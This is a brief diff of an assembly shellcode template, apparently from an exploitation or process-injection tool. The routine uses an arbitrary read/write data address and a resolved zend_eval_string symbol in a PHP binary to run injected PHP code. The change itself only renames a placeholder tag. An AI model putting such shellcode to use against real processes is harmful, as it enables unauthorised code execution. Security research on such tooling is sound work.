@@ -54,7 +54,7 @@ execute_php_code_copy_phpcode:
 	mov eax, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
 	add eax, 128
 	push eax
-	mov edx, [FUNCTION_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):FUNCTION_ADDRESS]
+	mov edx, [SYMBOL_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):SYMBOL_ADDRESS]
 	call edx
 
 	add esp, 0x10
